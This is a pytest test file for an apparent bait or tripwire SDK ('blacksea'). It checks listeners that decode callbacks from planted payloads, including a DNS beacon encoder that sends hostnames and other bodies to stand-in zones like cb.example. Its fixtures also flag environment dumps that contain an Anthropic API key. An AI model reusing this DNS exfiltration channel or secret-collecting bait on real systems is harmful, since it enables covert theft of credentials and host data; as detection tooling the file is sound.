"""Contract tests for blacksea.sdk.

Validates that the public API imports, that the golden-test runner + loose
matcher behave correctly, that the registration gates fire, and that the
framework ``TypedEvent`` structurally excludes ``details`` and ``sensor_time``.

Uses a stdlib-JSON fixture listener so the SDK keeps zero third-party runtime
deps.
"""

import dataclasses
import json

import pytest

from blacksea.sdk.listener import (
    ANY,
    AnalyzerOutput,
    Artifact,
    BoobyBait,
    BuildContext,
    Envelope,
    GoldenCase,
    Listener,
    Signals,
    assert_golden,
    run_golden_case,
    run_golden_cases,
    test_envelope,
)


# ── A minimal, correct fixture listener (JSON body) ─────────────────────────
class _JsonListener(Listener):
    def encode_body(self, data: dict) -> bytes:
        return json.dumps(data, sort_keys=True, separators=(",", ":")).encode()

    def decode_body(self, body: bytes) -> dict:
        from blacksea.sdk.listener import BodyDecodeError

        try:
            return json.loads(body.decode())
        except Exception as exc:
            raise BodyDecodeError(str(exc))

    def interpret(self, envelope: Envelope, body: bytes) -> AnalyzerOutput:
        if not body:
            return AnalyzerOutput(event_type="signal_only")
        from blacksea.sdk.listener import BodyDecodeError

        try:
            data = self.decode_body(body)
        except BodyDecodeError as exc:
            return AnalyzerOutput(event_type="signal_only", details={"_decode_error": str(exc)})
        caution = "high" if data.get("env", {}).get("ANTHROPIC_API_KEY") else "low"
        return AnalyzerOutput(
            event_type="payload_exec_collect",
            signals=Signals(fingerprint_hash="deadbeef", caution_level=caution),
            details=data,
        )

    def golden_cases(self) -> list[GoldenCase]:
        sample = {"env": {"HOME": "/root", "ANTHROPIC_API_KEY": "sk-ant-x"}}
        return [
            GoldenCase(
                label="normal hit — API key present",
                body=self.encode_body(sample),
                envelope=test_envelope(tier=2, bait_id="json-bait"),
                # fingerprint_hash omitted in fixture (don't-care); caution asserted
                expected=AnalyzerOutput(
                    event_type="payload_exec_collect",
                    signals=Signals(caution_level="high"),
                    details=sample,
                ),
            ),
            GoldenCase(
                label="signal-only (zero body, tier 0)",
                body=b"",
                envelope=test_envelope(tier=0, bait_id="json-bait"),
                expected=AnalyzerOutput(event_type="signal_only"),
            ),
            GoldenCase(
                label="malformed body",
                body=b"\xff\xfe not json",
                envelope=test_envelope(tier=2, bait_id="json-bait"),
                expected=AnalyzerOutput(
                    event_type="signal_only",
                    details={"_decode_error": ANY},  # message not pinned
                ),
            ),
        ]


# ── Bad fixture listeners used to prove the runner rejects them ──────────────
class _RaisingListener(_JsonListener):
    def interpret(self, envelope, body):  # violates "must never raise"
        raise RuntimeError("boom")


class _NoZeroBodyListener(_JsonListener):
    def golden_cases(self):
        # Deliberately omits the required zero-body case.
        return [
            GoldenCase(
                label="only-normal",
                body=self.encode_body({"a": 1}),
                envelope=test_envelope(),
                expected=AnalyzerOutput(event_type="payload_exec_collect"),
            )
        ]


# ── Tests ────────────────────────────────────────────────────────────────────
def test_public_imports():
    from blacksea.sdk.listener import AnalyzerOutput, BoobyBait, Envelope, Listener  # noqa: F401


def test_boobybait_is_listener_alias():
    # BoobyBait must be the same object as Listener (deprecated alias).
    assert BoobyBait is Listener


def test_golden_cases_all_pass():
    assert_golden(_JsonListener())  # raises on any failure


def test_run_golden_cases_reports_per_case():
    results = run_golden_cases(_JsonListener())
    assert all(r.passed for r in results), [(r.label, r.detail) for r in results]
    # 3 declared cases, no extra gate failure appended.
    assert len(results) == 3


def test_runner_flags_interpret_that_raises():
    listener = _RaisingListener()
    case = listener.golden_cases()[0]
    result = run_golden_case(listener, case)
    assert not result.passed
    assert "must never raise" in result.detail


def test_registration_gate_requires_zero_body_case():
    results = run_golden_cases(_NoZeroBodyListener())
    gate = [r for r in results if r.label == "<registration gate>"]
    assert gate and not gate[0].passed
    assert "zero-body" in gate[0].detail


def test_matcher_catches_event_type_mismatch():
    listener = _JsonListener()
    bad = GoldenCase(
        label="wrong event_type",
        body=listener.encode_body({"env": {}}),
        envelope=test_envelope(),
        expected=AnalyzerOutput(event_type="tripwire_fire"),
    )
    result = run_golden_case(listener, bad)
    assert not result.passed
    assert "event_type" in result.detail


def test_matcher_catches_signal_value_mismatch():
    listener = _JsonListener()
    bad = GoldenCase(
        label="wrong caution",
        body=listener.encode_body({"env": {}}),  # no API key → caution "low"
        envelope=test_envelope(),
        expected=AnalyzerOutput(
            event_type="payload_exec_collect",
            signals=Signals(caution_level="high"),
        ),
    )
    result = run_golden_case(listener, bad)
    assert not result.passed
    assert "caution_level" in result.detail


def test_any_sentinel_matches_present_key_only():
    listener = _JsonListener()
    case = GoldenCase(
        label="details key present, value not asserted",
        body=listener.encode_body({"env": {"X": "Y"}}),
        envelope=test_envelope(),
        expected=AnalyzerOutput(
            event_type="payload_exec_collect",
            details={"env": ANY},  # presence only
        ),
    )
    assert run_golden_case(listener, case).passed


def test_matcher_catches_missing_details_key():
    listener = _JsonListener()
    bad = GoldenCase(
        label="missing key",
        body=listener.encode_body({"env": {}}),
        envelope=test_envelope(),
        expected=AnalyzerOutput(
            event_type="payload_exec_collect",
            details={"not_present": 1},
        ),
    )
    result = run_golden_case(listener, bad)
    assert not result.passed
    assert "missing expected key" in result.detail


def test_cannot_instantiate_incomplete_listener():
    class Partial(Listener):
        def encode_body(self, data):  # missing decode_body, interpret, golden_cases
            ...

    with pytest.raises(TypeError):
        Partial()  # abstractmethods unimplemented


def test_frozen_types_are_immutable():
    env = test_envelope()
    with pytest.raises(dataclasses.FrozenInstanceError):
        env.bait_id = "mutated"  # type: ignore[misc]


def test_test_envelope_tier0_defaults():
    env = test_envelope(tier=0)
    assert env.channel == "dns"
    assert env.sig_valid is False
    assert env.observed_source.source_type == "resolver"
    assert env.observed_source.ja3 is None


def test_typed_event_excludes_details_and_sensor_time():
    # Structural exclusion (see context.md's Invariants section): the fields must not exist on the type.
    from blacksea.sdk.framework.types import TypedEvent

    field_names = {f.name for f in dataclasses.fields(TypedEvent)}
    assert "details" not in field_names
    assert "sensor_time" not in field_names
    # And the fields Tier-2 does need are present.
    assert {"record_id", "bait_id", "edge_recv_time", "fingerprint_hash"} <= field_names


def test_typed_event_not_in_listener():
    import blacksea.sdk.listener as listener

    assert "TypedEvent" not in listener.__all__
    assert not hasattr(listener, "TypedEvent")


# ── get_comms_source / communication primitives ──────────────────────────────

def test_get_comms_source_in_listener():
    from blacksea.sdk.listener import get_comms_source  # noqa: F401
    import blacksea.sdk.listener as listener
    assert "get_comms_source" in listener.__all__


def test_get_comms_source_dns_contains_function():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns"])
    assert "def send_dns" in src


def test_get_comms_source_http_contains_function():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["http"])
    assert "def send_http" in src


def test_get_comms_source_dns_multiturn_contains_function():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns_multiturn"])
    assert "def send_dns_multiturn" in src


def test_get_comms_source_multiple_channels():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns", "http"])
    assert "def send_dns" in src
    assert "def send_http" in src


def test_get_comms_source_unknown_channel_raises():
    from blacksea.sdk.listener import get_comms_source
    with pytest.raises(ValueError, match="Unknown channel"):
        get_comms_source(["ftp"])


def test_get_comms_source_is_valid_python():
    from blacksea.sdk.listener import get_comms_source
    import ast
    for channel in ("dns", "http", "dns_multiturn"):
        src = get_comms_source([channel])
        ast.parse(src)  # raises SyntaxError if invalid


def test_inlined_dns_source_is_callable():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns"])
    ns: dict = {}
    exec(src, ns)
    assert callable(ns["send_dns"])
    # Call with a dummy token/zone — should not raise (errors are swallowed).
    ns["send_dns"]("aabbccddeeff0011", "cb.blacksea.invalid")


def _decode_dns_beacon(qname: str, zone: str) -> tuple[int, int, bytes, bytes, int, bytes]:
    """Mirror the edge's receiver_dns.go parseDNS: strip the zone, base32-decode every
    remaining label, concatenate, split into the 19B header + trailing body."""
    import base64

    data_part = qname[: -(len(zone) + 1)] if qname.endswith("." + zone) else qname
    buf = b"".join(
        base64.b32decode(label.upper() + "=" * (-len(label) % 8))
        for label in data_part.split(".")
    )
    ev = buf[0] >> 4
    flags = buf[0] & 0x0F
    token = buf[1:9]
    session_id = buf[9:17]
    seq_no = int.from_bytes(buf[17:19], "big")
    body = buf[19:]
    return ev, flags, token, session_id, seq_no, body


def test_inlined_dns_encodes_wire_header():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns"])
    ns: dict = {}
    exec(src, ns)
    import types
    captured: list[str] = []
    fake_socket = types.SimpleNamespace(
        getaddrinfo=lambda host, *a, **kw: captured.append(host),
        socket=lambda *a, **kw: (_ for _ in ()).throw(AssertionError("server unset: must not open a raw socket")),
    )
    ns["_socket"] = fake_socket
    ns["send_dns"]("aabbccddeeff0011", "cb.example", body=b"victim-box")
    assert len(captured) == 1
    qname = captured[0]
    assert qname.endswith(".cb.example")
    ev, flags, token, session_id, seq_no, body = _decode_dns_beacon(qname, "cb.example")
    assert ev == 1
    assert flags == 0
    assert token == bytes.fromhex("aabbccddeeff0011")
    assert len(session_id) == 8
    assert seq_no == 0
    assert body == b"victim-box"


def test_inlined_dns_multi_label_body_round_trips():
    # A body long enough that header(19B) + body spills past one 39B label (mode 2) — the
    # edge decodes each label independently and concatenates raw bytes, so label boundaries must
    # land on base32 group boundaries or the reassembled body corrupts (regression: an earlier
    # version sliced the *encoded string* at 63 chars, not the *raw bytes* at 39, which splits
    # mid base32-group since 63 isn't a multiple of 8).
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns"])
    ns: dict = {}
    exec(src, ns)
    import types
    captured: list[str] = []
    fake_socket = types.SimpleNamespace(
        getaddrinfo=lambda host, *a, **kw: captured.append(host),
    )
    ns["_socket"] = fake_socket
    long_body = b'{"hostname":"a-fairly-long-hostname.example.internal.corp"}'
    assert len(long_body) > 20  # must exceed the single-label free budget to hit mode 2
    ns["send_dns"]("aabbccddeeff0011", "cb.example", body=long_body)
    assert len(captured) == 1
    qname = captured[0]
    assert qname.count(".") >= 2  # more than one data label before the zone
    _, _, token, _, seq_no, body = _decode_dns_beacon(qname, "cb.example")
    assert token == bytes.fromhex("aabbccddeeff0011")
    assert seq_no == 0
    assert body == long_body


def test_inlined_dns_direct_server_sends_raw_udp():
    from blacksea.sdk.listener import get_comms_source
    src = get_comms_source(["dns"])
    ns: dict = {}
    exec(src, ns)
    import types

    sent: list[tuple[bytes, tuple]] = []

    class FakeSock:
        def settimeout(self, _):
            pass

        def sendto(self, data, addr):
            sent.append((data, addr))

        def close(self):
            pass

    fake_socket = types.SimpleNamespace(
        AF_INET=0, SOCK_DGRAM=0,
        socket=lambda *a, **kw: FakeSock(),
        getaddrinfo=lambda *a, **kw: (_ for _ in ()).throw(AssertionError("must not use the OS resolver when server is set")),
    )
    ns["_socket"] = fake_socket
    ns["send_dns"]("aabbccddeeff0011", "cb.example", server="127.0.0.1:15353")
    assert len(sent) == 1
    packet, addr = sent[0]
    assert addr == ("127.0.0.1", 15353)
    assert len(packet) > 12  # DNS header alone is 12B; a qname + question follows


def test_inlined_dns_multiturn_splits_into_chunks():
    from blacksea.sdk.listener import get_comms_source
    import types
    src = get_comms_source(["dns_multiturn"])
    ns: dict = {}
    exec(src, ns)
    captured: list[str] = []
    fake_socket = types.SimpleNamespace(
        getaddrinfo=lambda host, *a, **kw: captured.append(host)
    )
    ns["_socket"] = fake_socket
    ns["_time"] = types.SimpleNamespace(sleep=lambda _: None)
    ns["send_dns_multiturn"](b"hello world", "cb.example", delay=0)
    assert len(captured) >= 1
    # Each query must be <seq>.<chunk>.<zone>
    for q in captured:
        parts = q.split(".")
        assert len(parts) >= 3


# ── hostname_probe bait (manifest-only model — payload/listener/vessel live in
#    lure_material/, referenced from test_fixtures/baits/hostname_probe/manifest.yaml;
#    these tests load the catalog entry directly by path) ─────────────────────────────

def _load_hostname_probe_listener():
    import importlib.util
    from pathlib import Path
    listener_file = (
        Path(__file__).parents[3] / "lure_material" / "payloads" / "hostname_grab_dns" / "listener.py"
    )
    spec = importlib.util.spec_from_file_location("hostname_probe_listener", listener_file)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.HostnameGrabDNSListener


def test_hostname_probe_listener_golden_cases_pass():
    from blacksea.sdk.listener import assert_golden
    assert_golden(_load_hostname_probe_listener()())


def test_hostname_probe_payload_has_correct_structure():
    from pathlib import Path
    payload_file = (
        Path(__file__).parents[3] / "lure_material" / "payloads" / "hostname_grab_dns" / "payload.py"
    )
    source = payload_file.read_text()
    # Uses direct SDK comms import (not the legacy get_comms_source template model).
    assert "from blacksea.sdk.payload" in source
    assert "send_dns" in source
    # Expects the factory to inject _ZONE before bundling.
    assert "_ZONE" in source
    # Must not import blacksea at runtime (bundler inlines it).
    # The import is only at build time in the factory environment.
    assert "import blacksea" in source or "from blacksea" in source


def test_hostname_probe_staging_vessel_exists_and_is_executable():
    import os
    from pathlib import Path
    setup_sh = (
        Path(__file__).parents[3] / "lure_material" / "staging_vessels" / "identity" / "setup.sh"
    )
    assert setup_sh.exists(), "staging_vessel/setup.sh missing"
    assert os.access(setup_sh, os.X_OK), "staging_vessel/setup.sh is not executable"
